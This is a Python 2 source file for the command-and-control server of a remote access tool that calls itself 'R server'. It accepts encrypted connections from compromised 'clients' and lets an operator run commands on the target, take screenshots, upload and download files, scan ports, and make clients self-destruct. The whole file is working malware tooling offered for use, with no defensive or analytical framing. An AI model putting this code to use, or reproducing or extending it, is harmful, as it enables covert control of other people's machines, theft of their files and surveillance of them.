#!/usr/bin/env python

import argparse
import readline
import socket
import sys
import threading
import os

from libr.crypto import encrypt, decrypt, diffiehellman

# ascii banner (Crawford2) - http://patorjk.com/software/taag/
BANNER = '''
                     .                  
     ooo         ,-_-|        ,,,,,     
    (o o)       ([o o])      /(o o)\    
ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo-
'''
CLIENT_COMMANDS = ['execute', 'ls', 'scan']
HELP_TEXT = '''Command             | Description
---------------------------------------------------------------------------
client <id>         | Connect to a client.
clients             | List connected clients.
execute <command>   | Execute a command on the target.
help                | Show this help menu.
kill                | Kill the client connection.
ls                  | List files in the current directory.
quit                | Exit the server and keep all clients alive.
screenshot          | Take a screenshot.
scan <ip>           | Scan top 25 TCP ports on a single host.
upload              | Upload file to a client.
download            | Download file from a client
'''


class Server(threading.Thread):
    clients = {}
    client_count = 1
    current_client = None

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            dhkey = diffiehellman(conn)
            client_id = self.client_count
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def send_client(self, message, client):
        try:
            enc_message = encrypt(message, client.dhkey)
            client.conn.send(enc_message)
        except Exception as e:
            print 'Error: {}'.format(e)

    def recv_client(self, client):
        try:
            recv_data = client.conn.recv(4096)
            print decrypt(recv_data, client.dhkey)
        except Exception as e:
            print 'Error: {}'.format(e)

    def recv_schot(self, client):
        imgFile = open('screenshot_server.png', 'w')
        try:
            recv_data = client.conn.recv(40960000)
            imgData = decrypt(recv_data, client.dhkey)
            imgFile.write(imgData)

        except Exception as e:
            print 'Error: {}'.format(e)

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print 'Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print 'Error: Invalid Client ID.'

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print 'ID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])

    def quit_server(self, _):
        if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def goodbye_server(self, _):
        if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('selfdestruct', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print HELP_TEXT

    def screenshot(self, _):
        self.send_client('screenshot', self.current_client)
        self.recv_schot(self.current_client)

    def upload(self, _):
        path = raw_input('Input local file path: ')
        fname = os.path.basename(path)
        fsize = os.path.getsize(path)
        if os.path.isfile(path):
            try:
                self.send_client('upload', self.current_client)
                self.send_client(fname, self.current_client)
                sendfile = open(path, 'r')
                data = sendfile.read(int(fsize))
                self.send_client(data, self.current_client)
                self.recv_client(self.current_client)
            except IOError:
                print('Error: Permission denied.')
        else:
            print('Error: File not found.')

    def download(self, client):
        path = raw_input('Intput client\'s file path: ')
        fname = os.path.basename(path)
        # send remote file path
        self.send_client('download', self.current_client)
        self.send_client(path, self.current_client)
        # recv file
        str = "@server"
        nname = str + fname
        rfile = open(nname, 'w')
        try:
            recv_data = self.current_client.conn.recv(4096)
            dedata = decrypt(recv_data, self.current_client.dhkey)
            rfile.write(dedata)
            self.recv_client(self.current_client)
        except Exception as e:
            print 'Error: {}'.format(e)


class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn = conn
        self.addr = addr
        self.dhkey = dhkey
        self.uid = uid


def get_parser():
    parser = argparse.ArgumentParser(description='R server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    port = args['port']
    client = None

    print BANNER

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'R server listening for connections on port {}.'.format(port)

    # server side commands
    server_commands = {
        'client': server.select_client,
        'clients': server.list_clients,
        'goodbye': server.goodbye_server,
        'help': server.print_help,
        'kill': server.kill_client,
        'quit': server.quit_server,
        'selfdestruct': server.selfdestruct_client,
        'screenshot': server.screenshot,
        'upload': server.upload,
        'download': server.download
    }

    def completer(text, state):
        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    # turn tab completion on
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    while True:
        if server.current_client:
            ccid = server.current_client.uid
        else:
            ccid = '?'

        prompt = raw_input('\n[{}] R> '.format(ccid)).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # if cmd =='upload':
        #     server.upload(server.current_client)
        # if cmd == 'download':
        #     server.download()

        if cmd in server_commands:
            server_commands[cmd](action)


        elif cmd in CLIENT_COMMANDS:
            if ccid == '?':
                print 'Error: No client selected.'
                continue

            print 'Running {}...'.format(cmd)
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)

        else:
            print 'Invalid command, type "help" to see a list of commands.'


if __name__ == '__main__':
    main()
